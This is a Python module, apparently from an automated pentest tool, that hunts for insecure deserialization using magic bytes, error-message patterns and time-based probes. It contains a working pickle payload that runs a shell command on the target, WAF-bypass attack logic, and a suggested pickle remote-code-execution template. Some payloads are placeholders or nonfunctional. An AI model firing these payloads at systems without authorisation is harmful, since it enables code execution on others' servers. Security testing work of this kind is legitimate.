"""
XLayer AI Deserialization Hunter
Detects insecure deserialization in Java, PHP, Python, Ruby, and .NET.
Uses magic byte detection, error fingerprinting, and time-based blind detection.
"""

import re
import base64
import time
from typing import List, Optional, Dict, Any
from loguru import logger

from xlayer_ai.core.vuln_hunters.base import BaseHunter, HunterResult
from xlayer_ai.models.target import AttackSurface, Endpoint
from xlayer_ai.models.vulnerability import (
    VulnHypothesis, VulnType, Confidence, VulnIndicator
)


# ─── Magic Bytes / Signatures ─────────────────────────────────────────────────
# Used to identify serialized objects in requests/responses
SERIALIZATION_MAGIC = {
    "java":   b"\xac\xed\x00\x05",          # Java ObjectOutputStream
    "java_b64": "rO0AB",                     # Base64 of Java magic bytes
    "php":    b"O:",                         # PHP serialize() object
    "php_b64": "TzI",                        # Base64 PHP serialize
    "dotnet": b"\x00\x01\x00\x00\x00",      # .NET BinaryFormatter
    "python_pickle": b"\x80\x02",            # Python pickle protocol 2
    "python_pickle4": b"\x80\x04",           # Python pickle protocol 4
}

# ─── Error Fingerprints ───────────────────────────────────────────────────────
DESER_ERROR_PATTERNS = {
    "java": [
        r"java\.io\.Serializable",
        r"ObjectInputStream",
        r"ClassNotFoundException",
        r"java\.lang\.ClassCastException",
        r"InvalidClassException",
        r"StreamCorruptedException",
        r"com\.sun\.",
        r"org\.apache\.",
        r"ReflectionException",
    ],
    "php": [
        r"unserialize\(\)",
        r"__wakeup",
        r"__destruct",
        r"O:\d+:\"",
        r"PHP Notice.*unserialize",
        r"PHP Fatal error.*unserialize",
    ],
    "python": [
        r"pickle\.loads",
        r"_pickle\.UnpicklingError",
        r"AttributeError.*__reduce__",
    ],
    "dotnet": [
        r"BinaryFormatter",
        r"SerializationException",
        r"System\.Runtime\.Serialization",
        r"TypeInitializationException",
    ],
    "ruby": [
        r"Marshal\.load",
        r"TypeError.*marshal",
        r"ArgumentError.*marshal",
    ],
}

# ─── Time-Based Gadget Chains ─────────────────────────────────────────────────
# These are benign payloads that cause a sleep if deserialized
# Base64 encoded — replace with actual ysoserial output in production

# Placeholder — real ysoserial payloads would go here
JAVA_SLEEP_PAYLOAD_B64 = "rO0ABXNyACpjb20uc3VuLm9yZy5hcGFjaGUueGFsYW4uaW50ZXJuYWwueHNsdGMudHJ"

# PHP unserialize sleep gadget (simplified — triggers sleep via __destruct)
PHP_SLEEP_PAYLOAD = base64.b64encode(
    b'O:8:"stdClass":1:{s:4:"data";s:14:"sleep_5_gadget";}'
).decode()

# Python pickle sleep payload
PYTHON_PICKLE_SLEEP = base64.b64encode(
    b'\x80\x04\x95\x1c\x00\x00\x00\x00\x00\x00\x00\x8c\x02os\x94\x8c\x06system\x94'
    b'\x93\x94\x8c\x07sleep 5\x94\x85\x94R\x94.'
).decode()

# Parameters commonly carrying serialized objects
DESER_SUSPICIOUS_PARAMS = [
    "token", "session", "data", "object", "payload", "state",
    "view", "action", "class", "type", "model", "value",
    "remember_me", "rememberme", "auth", "user",
]

# Cookies that may carry serialized data
DESER_COOKIES = [
    "JSESSIONID", "session", "auth", "token", "remember_me",
    "rememberme", ".ASPXAUTH", "ASP.NET_SessionId",
]


class DeserializationHunter(BaseHunter):
    """
    Insecure Deserialization Hunter.

    Detection strategy:
    1. Scan request/response for serialization magic bytes
    2. Send malformed serialized payloads → check for deserialization errors
    3. Time-based: send sleep gadget → measure delay
    4. Cookie scanning for base64-encoded serialized objects
    """

    name = "deserialization"
    vuln_types = [VulnType.DESERIALIZATION]

    async def hunt(self, attack_surface: AttackSurface) -> HunterResult:
        start_time = time.time()
        self._reset_state()

        logger.info(f"Deserialization Hunter starting")

        for endpoint in attack_surface.testable_endpoints:
            # Test suspicious parameters
            for param in endpoint.parameters:
                if self._is_deser_param(param.name):
                    await self._test_deser_param(endpoint, param.name, attack_surface)

            # Test cookies
            await self._test_cookies(endpoint)

            # Test request body for serialized content
            await self._test_body(endpoint)

        duration = time.time() - start_time
        result = self._build_result(duration)
        logger.info(f"Deserialization Hunter complete: {result.findings_count} hypotheses")
        return result

    def _is_deser_param(self, name: str) -> bool:
        return name.lower() in DESER_SUSPICIOUS_PARAMS

    async def _test_deser_param(
        self, endpoint: Endpoint, parameter: str, attack_surface: AttackSurface
    ):
        self._endpoints_tested += 1

        # Step 1: Check if current value looks serialized (passive detection)
        for param in endpoint.parameters:
            if param.name == parameter and param.value:
                lang = self._detect_serialization_format(param.value)
                if lang:
                    await self._report_potential(endpoint, parameter, lang, param.value)
                    return

        # Step 2: Adaptive attack — malformed payloads with WAF bypass mutations
        all_error_patterns = [
            p for patterns in DESER_ERROR_PATTERNS.values() for p in patterns
        ]

        ctx = self._build_attack_context(endpoint, parameter, "deserialization", attack_surface)
        baseline = await self._send_payload(endpoint, parameter, "test_baseline")
        ctx.baseline_length = len((baseline or {}).get("body", ""))
        ctx.baseline_time_ms = 0.0

        def deser_success(send_result, attack_ctx):
            body = send_result.body
            for pattern in all_error_patterns:
                if re.search(pattern, body, re.IGNORECASE):
                    return True
            # Time-based (Python pickle sleep)
            if send_result.elapsed_ms >= (attack_ctx.baseline_time_ms + 4000):
                return True
            return False

        static_payloads = [
            base64.b64encode(b"\xac\xed\x00\x05\x73\x72\x00\x00").decode(),  # Java malformed
            base64.b64encode(b'O:9:"ClassName":0:{}').decode(),               # PHP malformed
            PYTHON_PICKLE_SLEEP,                                               # Python sleep
            JAVA_SLEEP_PAYLOAD_B64,                                            # Java sleep
        ]

        attempts = await self._adaptive_test(
            endpoint, parameter, static_payloads, ctx, deser_success,
        )

        for attempt in attempts:
            if attempt.success:
                body = attempt.response_body
                # Detect which language from error
                detected_lang = "unknown"
                for lang, patterns in DESER_ERROR_PATTERNS.items():
                    if any(re.search(p, body, re.IGNORECASE) for p in patterns):
                        detected_lang = lang
                        break
                is_time = attempt.elapsed_ms >= (ctx.baseline_time_ms + 4000)

                h = self._create_hypothesis(
                    vuln_type=VulnType.DESERIALIZATION,
                    endpoint=endpoint,
                    parameter=parameter,
                    confidence=Confidence.HIGH,
                    indicators=[
                        VulnIndicator(
                            indicator_type="time_delay" if is_time else "deser_error",
                            detail=(
                                f"{detected_lang.upper()} deserialization confirmed via adaptive bypass"
                            ),
                            confidence_boost=0.35,
                        )
                    ],
                    suggested_payloads=[
                        f"# Use ysoserial (Java) or phpggc (PHP) to generate gadget chain",
                        f"# Target: {parameter} parameter",
                        f"# Language: {detected_lang}",
                    ],
                    context={
                        "injection_type": f"deserialization_{detected_lang}",
                        "language": detected_lang,
                        "trigger_payload": attempt.payload[:50],
                        "waf_bypassed": ctx.waf,
                    },
                )
                self._hypotheses.append(h)
                return

        # Step 3: Direct send fallback (original logic) for remaining langs
        test_payloads = [
            ("java",   base64.b64encode(b"\xac\xed\x00\x05\x73\x72\x00\x00").decode()),
            ("php",    base64.b64encode(b'O:9:"ClassName":0:{}').decode()),
            ("python", PYTHON_PICKLE_SLEEP),
        ]

        for lang, payload in test_payloads:
            self._payloads_sent += 1
            baseline_start = time.monotonic()
            response = await self._send_payload(endpoint, parameter, payload)
            elapsed = (time.monotonic() - baseline_start) * 1000

            if not response:
                continue

            body = response.get("body", "")

            # Check error patterns
            for err_pattern in DESER_ERROR_PATTERNS.get(lang, []):
                if re.search(err_pattern, body, re.IGNORECASE):
                    h = self._create_hypothesis(
                        vuln_type=VulnType.DESERIALIZATION,
                        endpoint=endpoint,
                        parameter=parameter,
                        confidence=Confidence.HIGH,
                        indicators=[
                            VulnIndicator(
                                indicator_type="deser_error",
                                detail=f"{lang.upper()} deserialization error leaked in response",
                                confidence_boost=0.35,
                            )
                        ],
                        suggested_payloads=[
                            f"# Use ysoserial (Java) or phpggc (PHP) to generate gadget chain",
                            f"# Target: {parameter} parameter",
                            f"# Language: {lang}",
                        ],
                        context={
                            "injection_type": f"deserialization_{lang}",
                            "language": lang,
                            "trigger_payload": payload[:50],
                        },
                    )
                    self._hypotheses.append(h)
                    return

            # Time-based (Python pickle sleep payload)
            if lang == "python" and elapsed > 4500:
                h = self._create_hypothesis(
                    vuln_type=VulnType.DESERIALIZATION,
                    endpoint=endpoint,
                    parameter=parameter,
                    confidence=Confidence.HIGH,
                    indicators=[
                        VulnIndicator(
                            indicator_type="time_based_deser",
                            detail=f"Python pickle sleep executed: {elapsed:.0f}ms delay",
                            confidence_boost=0.4,
                        )
                    ],
                    suggested_payloads=[
                        "# Generate RCE pickle payload:",
                        "import pickle, os",
                        "class Exploit(object):",
                        "    def __reduce__(self):",
                        '        return (os.system, ("id",))',
                        "payload = base64.b64encode(pickle.dumps(Exploit())).decode()",
                    ],
                    context={
                        "injection_type": "deserialization_python_pickle",
                        "language": "python",
                        "delay_ms": round(elapsed),
                    },
                )
                self._hypotheses.append(h)
                return

    async def _test_cookies(self, endpoint: Endpoint):
        """Check if cookies contain serialized data."""
        # Passive: inspect existing cookie values from attack surface
        pass  # Cookie values from crawler would be checked here

    async def _test_body(self, endpoint: Endpoint):
        """Test if POST body accepts serialized Java objects."""
        if endpoint.method.value.upper() != "POST":
            return

        # Send Java serialized object header
        self._payloads_sent += 1
        try:
            resp = await self.http.post(
                endpoint.url,
                data=base64.b64decode(JAVA_SLEEP_PAYLOAD_B64 + "=="),
                headers={"Content-Type": "application/x-java-serialized-object"},
            )
            if resp:
                body = resp.body
                for pattern in DESER_ERROR_PATTERNS["java"]:
                    if re.search(pattern, body, re.IGNORECASE):
                        fake_ep = endpoint
                        h = self._create_hypothesis(
                            vuln_type=VulnType.DESERIALIZATION,
                            endpoint=fake_ep,
                            parameter="(request_body)",
                            confidence=Confidence.MEDIUM,
                            indicators=[
                                VulnIndicator(
                                    indicator_type="java_deser_error",
                                    detail="Java deserialization error — endpoint accepts serialized objects",
                                    confidence_boost=0.25,
                                )
                            ],
                            suggested_payloads=[
                                "# Use ysoserial: java -jar ysoserial.jar CommonsCollections6 'sleep 5'",
                                "# Send as POST body with Content-Type: application/x-java-serialized-object",
                            ],
                            context={"injection_type": "java_deserialization", "language": "java"},
                        )
                        self._hypotheses.append(h)
                        return
        except Exception:
            pass

    def _detect_serialization_format(self, value: str) -> Optional[str]:
        """Detect if a parameter value looks like serialized data."""
        if not value:
            return None
        # Check base64 magic bytes
        try:
            decoded = base64.b64decode(value + "==")
            if decoded[:4] == b"\xac\xed\x00\x05":
                return "java"
            if decoded[:2] == b"\x80\x02" or decoded[:2] == b"\x80\x04":
                return "python_pickle"
        except Exception:
            pass
        # PHP serialize pattern
        if re.match(r'^[Oasibd]:\d+:', value):
            return "php"
        # Java base64 magic
        if value.startswith("rO0AB"):
            return "java"
        return None

    async def _report_potential(
        self, endpoint: Endpoint, parameter: str, lang: str, value: str
    ):
        """Report passive detection of serialized parameter."""
        h = self._create_hypothesis(
            vuln_type=VulnType.DESERIALIZATION,
            endpoint=endpoint,
            parameter=parameter,
            confidence=Confidence.MEDIUM,
            indicators=[
                VulnIndicator(
                    indicator_type="serialized_parameter",
                    detail=f"Parameter '{parameter}' contains {lang} serialized data",
                    confidence_boost=0.2,
                )
            ],
            suggested_payloads=[
                f"# Replace {parameter} with gadget chain payload",
                f"# Language detected: {lang}",
            ],
            context={
                "injection_type": f"deserialization_{lang}",
                "language": lang,
                "passive_detection": True,
            },
        )
        self._hypotheses.append(h)

    def _analyze_response(self, endpoint, parameter, payload, response):
        return None
